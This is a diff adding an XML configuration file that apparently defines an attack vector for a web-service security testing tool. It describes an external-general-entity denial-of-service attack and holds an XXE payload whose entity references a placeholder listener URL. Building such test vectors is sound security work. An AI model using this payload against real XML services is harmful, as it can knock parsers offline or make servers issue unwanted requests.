@@ -1,0 +1,18 @@
+<config>
+<name>External General Entities</name>
+<description>The idea of this attack is to declare an external general entity and reference a large file on a network resource or locally (e.g. C:/pagefile.sys or /dev/random). However, conducting DoS attacks in such a manner is only applicable by making the parser process a large XML document.</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+</params>
+<attackvectors>
+<attackvector>
+<directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos SYSTEM "§tf_listenURL§" >
+]>
+<data>&dos;</data>]]></directMessage>
+</attackvector>
+</attackvectors>
+</config>
